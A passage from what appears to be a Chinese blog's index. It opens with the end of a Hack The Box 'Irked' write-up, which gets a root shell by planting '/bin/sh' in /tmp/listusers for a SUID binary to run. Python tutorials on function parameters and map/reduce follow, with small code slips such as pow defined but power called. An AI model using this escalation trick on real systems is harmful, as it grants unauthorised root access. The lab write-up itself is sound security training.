&#x2F;bin&#x2F;umount</span><br></pre></td></tr></table></figure>
<p>Inspect the viewuser binary</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">djmardov@irked:~$ &#x2F;usr&#x2F;bin&#x2F;viewuser</span><br><span class="line">This application is being devleoped to set and test user permissions</span><br><span class="line">It is still being actively developed</span><br><span class="line">(unknown) :0           2020-03-22 18:37 (:0)</span><br><span class="line">djmardov pts&#x2F;1        2020-03-23 09:52 (10.10.16.99)</span><br><span class="line">sh: 1: &#x2F;tmp&#x2F;listusers: not found</span><br></pre></td></tr></table></figure>
<p>viewuser似乎尝试执行<code>/tmp</code>中名为<code>listuser</code>的不存在的脚本，向脚本中写入bash命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">djmardov@irked:&#x2F;tmp$ touch listusers</span><br><span class="line">djmardov@irked:&#x2F;tmp$ echo &#39;#!&#x2F;bin&#x2F;bash&#39; &gt;&gt; listusers </span><br><span class="line">djmardov@irked:&#x2F;tmp$ echo &#39;&#x2F;bin&#x2F;sh&#39; &gt;&gt; listusers </span><br><span class="line">djmardov@irked:&#x2F;tmp$ &#x2F;usr&#x2F;bin&#x2F;viewuser </span><br><span class="line">This application is being devleoped to set and test user permissions</span><br><span class="line">It is still being actively developed</span><br><span class="line">(unknown) :0           2020-03-22 18:37 (:0)</span><br><span class="line">djmardov pts&#x2F;1        2020-03-23 09:52 (10.10.16.99)</span><br><span class="line">sh: 1: &#x2F;tmp&#x2F;listusers: Permission denied</span><br><span class="line">djmardov@irked:&#x2F;tmp$ chmod 777 listusers </span><br><span class="line">djmardov@irked:&#x2F;tmp$ &#x2F;usr&#x2F;bin&#x2F;viewuser </span><br><span class="line">This application is being devleoped to set and test user permissions</span><br><span class="line">It is still being actively developed</span><br><span class="line">(unknown) :0           2020-03-22 18:37 (:0)</span><br><span class="line">djmardov pts&#x2F;1        2020-03-23 09:52 (10.10.16.99)</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;1000(djmardov) groups&#x3D;1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Conclusion">0x04 Conclusion</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/irked.jpg" alt=""></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Python函数的参数</title>
    <url>/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0/</url>
    <content><![CDATA[<h1 id="Python函数的参数">Python函数的参数</h1>
<p>关于Python的参数，在各种代码中看到最多的可能就是<code>def func(*args, **kw)</code>这种参数组合，这篇文章就来讨论我们是如何一步一步来得到这样的参数组合。</p>
<h2 id="概述">概述</h2>
<p>Python的函数定义非常简单，但灵活度却非常大。除了正常定义的必选参数外，还可以使用默认参数、可变参数和关键字参数，使得函数定义出来的接口，不但能处理复杂的参数，还可以简化调用者的代码。</p>
<h2 id="位置参数">位置参数</h2>
<p>位置参数是我们最常见的函数参数，例如下面完成幂运算的<code>pow</code>函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>(<span class="params">x, n</span>):</span></span><br><span class="line">    s = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        n = n - <span class="number">1</span></span><br><span class="line">        s = s * x</span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>
<p><code>pow(x, n)</code>函数有两个参数：<code>x</code>和<code>n</code>，这两个参数都是位置参数，调用函数时，传入的两个值按照位置顺序依次赋值给参数<code>x</code>和<code>n</code>。</p>
<h2 id="默认参数">默认参数</h2>
<p>由于我们经常计算<code>x^2</code>，所以，完全可以把第二个参数<code>n</code>的默认值设定为<code>2</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>(<span class="params">x, n=<span class="number">2</span></span>):</span></span><br><span class="line">    s = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        n = n - <span class="number">1</span></span><br><span class="line">        s = s * x</span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>
<p>这样，我们在调用<code>pow(5)</code>时，相当于调用<code>pow(5, 2)</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>power(<span class="number">5</span>)</span><br><span class="line"><span class="number">25</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>power(<span class="number">5</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">25</span></span><br></pre></td></tr></table></figure>
<p><strong>设置默认参数时，有几点需要注意：</strong></p>
<ul>
<li>必选参数在前，默认参数在后，否则Python编译器会报错；</li>
<li>当函数有多个参数时，把变化大的参数放前面，变化小的参数放后面。变化小的参数就可以作为默认参数。</li>
<li>也可以不按顺序提供部分默认参数。当不按顺序提供部分默认参数时，需要把参数名写上。</li>
</ul>
<p>默认参数有个最大的坑，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">add_end</span>(<span class="params">L=[]</span>):</span></span><br><span class="line"><span class="meta">... </span>	L.append(<span class="string">&#x27;END&#x27;</span>)</span><br><span class="line"><span class="meta">... </span>	<span class="keyword">return</span> L</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add_end()</span><br><span class="line">[<span class="string">&#x27;END&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add_end()</span><br><span class="line">[<span class="string">&#x27;END&#x27;</span>, <span class="string">&#x27;END&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add_end()</span><br><span class="line">[<span class="string">&#x27;END&#x27;</span>, <span class="string">&#x27;END&#x27;</span>, <span class="string">&#x27;END&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>我们发现，每次使用默认参数调用<code>add_end()</code>函数时，都会“记住“上一次调用的结果。</p>
<p>原因如下：</p>
<p>Python函数在定义的时候，默认参数<code>L</code>的值就被计算出来了，即<code>[]</code>，因为默认参数<code>L</code>也是一个变量，它指向对象<code>[]</code>，每次调用该函数，如果改变了<code>L</code>的内容，则下次调用时，默认参数的内容就变了，不再是函数定义时的<code>[]</code>了。</p>
<p><strong>所以，默认参数必须指向不可变对象！！！</strong></p>
<p>上面的例子修改如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_end</span>(<span class="params">L=None</span>)：</span></span><br><span class="line">	if L == None:</span><br><span class="line">        L = []</span><br><span class="line">    L.append(<span class="string">&#x27;END&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> L</span><br></pre></td></tr></table></figure>
<h2 id="可变参数">可变参数</h2>
<p>以数学题为例子，给定一组数字a，b，c……，请计算a^2 + b^2 + c^2 + ……，由于参数不确定，首先想到可以把a，b，c…作为一个<code>list</code>或者<code>tuple</code>传进来。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">numbers</span>):</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> numbers:</span><br><span class="line">        sum = sum + n * n</span><br><span class="line">    <span class="keyword">return</span> sum</span><br></pre></td></tr></table></figure>
<p>在传参时就需要先组装一个<code>tuple</code>或<code>list</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>calc([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="number">14</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>calc((<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>))</span><br><span class="line"><span class="number">84</span></span><br></pre></td></tr></table></figure>
<p>如果使用可变参数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">*numbers</span>):</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> numbers:</span><br><span class="line">        sum = sum + n * n</span><br><span class="line">    <span class="keyword">return</span> sum</span><br></pre></td></tr></table></figure>
<p>在函数内部，参数<code>numbers</code>接收到的是一个tuple，因此，函数代码完全不变。但是，调用该函数时，可以传入任意个参数，包括0个参数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>calc(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>calc()</span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果已经有一个<code>list</code>或<code>tuple</code>，传参时可以使用<code>*</code>来对其进行解包操作：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>calc(*nums)</span><br><span class="line"><span class="number">14</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>*nums</code>表示把<code>nums</code>这个list的所有元素作为可变参数传进去。</p>
<h2 id="关键字参数">关键字参数</h2>
<p>关键字参数允许你传入0个或任意个含参数名的参数，这些关键字参数在函数内部自动组装为一个dict。例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span>(<span class="params">name, age, **kw</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;name:&#x27;</span>, name, <span class="string">&#x27;age:&#x27;</span>, age, <span class="string">&#x27;other:&#x27;</span>, kw)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在调用该函数时，可以只传入必选参数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Colin&#x27;</span>, <span class="number">24</span>)</span><br><span class="line">name: Colin age: <span class="number">24</span> other: &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>也可以传入任意个数的关键字参数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Bob&#x27;</span>, <span class="number">35</span>, city=<span class="string">&#x27;Beijing&#x27;</span>)</span><br><span class="line">name: Bob age: <span class="number">35</span> other: &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Beijing&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Adam&#x27;</span>, <span class="number">45</span>, gender=<span class="string">&#x27;M&#x27;</span>, job=<span class="string">&#x27;Engineer&#x27;</span>)</span><br><span class="line">name: Adam age: <span class="number">45</span> other: &#123;<span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;job&#x27;</span>: <span class="string">&#x27;Engineer&#x27;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>关键字参数可以扩展函数功能，例如：正在做一个用户注册的功能，除了用户名和年龄是必填项外，其他都是可选项，利用关键字参数来定义这个函数就能满足注册的需求。</p>
<p>和可变参数类似，可以先组装出一个<code>dict</code>，再把该<code>dict</code>转换为关键字参数传进去：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>extra = &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Beijing&#x27;</span>, <span class="string">&#x27;job&#x27;</span>: <span class="string">&#x27;Engineer&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Jack&#x27;</span>, <span class="number">24</span>, city=extra[<span class="string">&#x27;city&#x27;</span>], job=extra[<span class="string">&#x27;job&#x27;</span>])</span><br><span class="line">name: Jack age: <span class="number">24</span> other: &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Beijing&#x27;</span>, <span class="string">&#x27;job&#x27;</span>: <span class="string">&#x27;Engineer&#x27;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以简化为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>extra = &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Beijing&#x27;</span>, <span class="string">&#x27;job&#x27;</span>: <span class="string">&#x27;Engineer&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Jack&#x27;</span>, <span class="number">24</span>, **extra)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>**extra</code>表示把<code>extra</code>这个dict的所有key-value用关键字参数传入到函数的<code>**kw</code>参数，<code>kw</code>将获得一个dict，注意<code>kw</code>获得的dict是<code>extra</code>的一份拷贝，对<code>kw</code>的改动不会影响到函数外的<code>extra</code>。</p>
<h2 id="命令关键字参数">命令关键字参数</h2>
<p>对于关键字参数，函数的调用者可以传入任意不受限制的关键字参数。如果要限制关键字参数的名字，可以用命名关键字参数。例如只接收<code>city</code>和<code>job</code>作为关键字参数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span>(<span class="params">name, age, *, city, job</span>):</span></span><br><span class="line">    print(name, age, city, job)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>和关键字参数<code>**kw</code>不同，命名关键字参数需要一个特殊分隔符<code>*</code>，<code>*</code>后面的参数被视为命名关键字参数。</p>
<p>调用方式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Jack&#x27;</span>, <span class="number">24</span>, city=<span class="string">&#x27;Beijing&#x27;</span>, job=<span class="string">&#x27;Engineer&#x27;</span>)</span><br><span class="line">Jack <span class="number">24</span> Beijing Engineer</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果参数中已经有一个可变参数，后面跟着的命令关键字参数就不需要分隔符<code>*</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span>(<span class="params">name, age, *args, city, job</span>):</span></span><br><span class="line">    print(name, age, args, city, job)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>命名关键字参数必须传入参数名，这和位置参数不同。</strong></p>
<h2 id="参数组合">参数组合</h2>
<p>参数定义的顺序必须是：必选参数、默认参数、可变参数、命名关键字参数和关键字参数。例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f1</span>(<span class="params">a, b ,c=<span class="number">0</span>, *args, **kw</span>):</span></span><br><span class="line"><span class="meta">... </span>	print(<span class="string">&#x27;a =&#x27;</span>, a, <span class="string">&#x27;b =&#x27;</span>, b, <span class="string">&#x27;c =&#x27;</span>, c, <span class="string">&#x27;args =&#x27;</span>, args, <span class="string">&#x27;kw =&#x27;</span>, kw)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f2</span>(<span class="params">a, b, c=<span class="number">0</span>, *, d, **kw</span>):</span></span><br><span class="line"><span class="meta">... </span>	print(<span class="string">&#x27;a =&#x27;</span>, a, <span class="string">&#x27;b =&#x27;</span>, b, <span class="string">&#x27;c =&#x27;</span>, c, <span class="string">&#x27;d =&#x27;</span>, d, <span class="string">&#x27;kw =&#x27;</span>, kw)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>函数调用如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">0</span> args = () kw = &#123;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(<span class="number">1</span>,<span class="number">2</span>,c=<span class="number">3</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> args = () kw = &#123;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> args = () kw = &#123;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> args = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>) kw = &#123;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,x=<span class="number">99</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> args = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>) kw = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="number">99</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f2(<span class="number">1</span>,<span class="number">2</span>,d=<span class="number">99</span>,ext=<span class="literal">None</span>)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">0</span> d = <span class="number">99</span> kw = &#123;<span class="string">&#x27;ext&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>还可以用一个<code>tuple</code>和<code>dict</code>调用上述函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>args = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>kw = &#123;<span class="string">&#x27;d&#x27;</span>: <span class="number">99</span>, <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;#&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(*args, **kw)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> args = (<span class="number">4</span>,) kw = &#123;<span class="string">&#x27;d&#x27;</span>: <span class="number">99</span>, <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;#&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>args = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>kw = &#123;<span class="string">&#x27;d&#x27;</span>:<span class="number">88</span>, <span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;#&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f2(*args, **kw)</span><br><span class="line">a = <span class="number">1</span> b = <span class="number">2</span> c = <span class="number">3</span> d = <span class="number">88</span> kw = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;#&#x27;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="总结">总结</h2>
<ul>
<li><code>*args</code>是可变参数，<code>args</code>接收一个<code>tuple</code>；</li>
<li><code>**kw</code>是关键字参数，<code>kw</code>接收一个<code>dict</code>；</li>
<li>可变参数既可以直接传入：<code>func(1, 2, 3)</code>，还可以组装成一个<code>list</code>或<code>tuple</code>传入：<code>func(*(1, 2, 3))</code>；</li>
<li>关键字参数既可以直接传入：<code>func(a=1, b=2)</code>，还可以组装成一个<code>dict</code>传入：<code>func(**&#123;'a': 1, 'b': 2&#125;)</code>；</li>
<li>命名关键字参数是为了限制调用者可以传入的参数名，同时可以提供默认值；</li>
</ul>
]]></content>
      <categories>
        <category>编程</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python函数式编程之高阶函数</title>
    <url>/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="Python函数式编程之高阶函数">Python函数式编程之高阶函数</h1>
<p>今天我们就来看几个Python的高级函数：<code>Map</code>，<code>Reduce</code>，<code>Filter</code>，<code>Sorted</code>。</p>
<h2 id="Map-Function">Map Function</h2>
<h3 id="Definition">Definition</h3>
<p><code>map()</code>函数接收两个参数，一个是函数，一个是<code>Iterable</code>，<code>map</code>将传入的函数依次作用到序列的每个元素，并把结果作为新的<code>Iterable</code>返回。</p>
<h3 id="Example">Example</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x</span>):</span></span><br><span class="line"><span class="meta">... </span>	<span class="keyword">return</span> x*x</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = map(f, [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r</span><br><span class="line">&lt;map object at <span class="number">0x0000020AAF4C1668</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(r)</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(map(str, [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]))</span><br><span class="line">[<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h2 id="Reduce-Function">Reduce Function</h2>
<h3 id="Definition-v2">Definition</h3>
<p><code>reduce()</code>函数和<code>map()</code>相似，接收两个参数，一个是函数，一个<code>Iterable</code>。不同的是，<code>reduce()</code>把一个函数作用在一个序列<code>[x1, x2, x3, ...]</code>上，并且这个函数必须接收两个参数，<code>reduce()</code>把结果继续和序列的下一个元素做累积计算，形如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">reduce(f, [x1, x2, x3, x4]) = f(f(f(x1, x2), x3), x4)</span><br></pre></td></tr></table></figure>
<h3 id="Example-v2">Example</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">x, y</span>):</span></span><br><span class="line"><span class="meta">... </span>	<span class="keyword">return</span> x*<span class="number">10</span> + y</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reduce(fn, [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>])</span><br><span class="line"><span class="number">13579</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配合map()，我们就可以写出把str转换为int的函数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">char2nums</span>(<span class="params">s</span>):</span></span><br><span class="line"><span class="meta">... </span>	digits = &#123;<span class="string">&#x27;0&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;3&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;4&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;5&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;6&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;7&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;8&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;9&#x27;</span>: <span class="number">9</span>&#125;</span><br><span class="line"><span class="meta">... </span>	<span class="keyword">return</span> digits[s]</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reduce(fn, map(char2nums, <span class="string">&#x27;1234&#x27;</span>))</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>使用lambda表达式可以进一步化简：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">DIGITS = &#123;<span class="string">&#x27;0&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;3&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;4&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;5&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;6&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;7&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;8&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;9&#x27;</span>: <span class="number">9</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">char2num</span>(<span class="params">s</span>):</span></span><br><span class="line"> <span class="keyword">return</span> DIGITS[s]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2int</span>(<span class="params">s</span>):</span></span><br><span class="line"> <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x * <span class="number">10</span> + y, map(char2num, s))</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="Exercise">Exercise</h3>
<p>利用<code>map</code>和<code>reduce</code>编写一个<code>str2float</code>函数，把字符串<code>'123.456'</code>转换成浮点数<code>123.456</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">dig</span>):</span></span><br><span class="line">    dict = &#123;<span class="string">&#x27;0&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;1&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>:<span class="number">2</span>, <span class="string">&#x27;3&#x27;</span>:<span class="number">3</span>, <span class="string">&#x27;4&#x27;</span>:<span class="number">4</span>, <span class="string">&#x27;5&#x27;</span>:<span class="number">5</span>, <span class="string">&#x27;6&#x27;</span>:<span class="number">6</span>, <span class="string">&#x27;7&#x27;</span>:<span class="number">7</span>, <span class="string">&#x27;8&#x27;</span>:<span class="number">8</span>, <span class="string">&#x27;9&#x27;</span>:<span class="number">9</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> dict[dig]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x*<span class="number">10</span>+y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">h</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a/<span class="number">10</span>+b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2float</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> reduce(g, map(f,s[:s.find(<span class="string">&#x27;.&#x27;</span>)])) + reduce(h, map(f, s[<span class="number">-1</span>:-(len(s)-s.find(<span class="string">&#x27;.&#x27;</span>)):<span class="number">-1</span>]))/<span class="number">10</span></span><br></pre></td></tr></table></figure>
<h2 id="Filter-Function">Filter Function</h2>
<h3 id="Definition-v3">Definition</h3>
